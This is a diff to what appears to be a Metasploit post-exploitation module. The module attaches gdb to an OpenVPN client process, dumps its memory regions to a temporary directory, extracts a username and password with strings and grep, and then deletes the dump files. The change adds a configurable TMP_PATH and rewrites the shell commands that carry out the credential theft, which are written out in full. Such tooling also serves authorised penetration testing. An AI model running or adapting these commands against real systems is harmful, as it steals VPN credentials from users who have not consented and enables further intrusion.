@@ -34,13 +34,18 @@ class Metasploit4 < Msf::Post
 
     register_options(
       [
-        OptInt.new('PID', [true, 'Process IDentifier to OpenVPN client.'])
+        OptInt.new('PID', [true, 'Process IDentifier to OpenVPN client.']),
+        OptString.new('TMP_PATH', [true, 'The path to the directory to save dump process', '/tmp/'])
       ], self.class
     )
   end
 
   def pid
     datastore['PID']
+  end
+
+  def tmp_path
+    datastore['TMP_PATH']
   end
 
   def run
@@ -52,9 +57,9 @@ class Metasploit4 < Msf::Post
       return
     end
 
-    cmd_exec('/bin/grep rw-p /proc/'"#{pid}"'/maps | sed -n \'s/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p\' | while read start stop; do /usr/bin/gdb --batch-silent --silent --pid '"#{pid}"' -ex "dump memory '"#{pid}"'-$start-$stop.dump 0x$start 0x$stop"; done')
-    strings = cmd_exec('/usr/bin/strings *.dump | /bin/grep -B2 KnOQ  | /bin/grep -v KnOQ | /usr/bin/column | /usr/bin/awk \'{print "User: "$1"\nPass: "$2}\'')
-    cmd_exec('/bin/rm *.dump --force')
+    cmd_exec('/bin/grep rw-p /proc/'"#{pid}"'/maps | sed -n \'s/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p\' | while read start stop; do /usr/bin/gdb --batch-silent --silent --pid '"#{pid}"' -ex "dump memory '"#{tmp_path}#{pid}"'-$start-$stop.dump 0x$start 0x$stop"; done')
+    strings = cmd_exec("/usr/bin/strings #{tmp_path}*.dump | /bin/grep -B2 KnOQ  | /bin/grep -v KnOQ | /usr/bin/column | /usr/bin/awk '{print \"User: \"$1\"\\nPass: \"$2}'")
+    cmd_exec("/bin/rm #{tmp_path}*.dump --force")
 
     if strings.empty?
       print_error('No credentials. You can check if the PID is correct.')
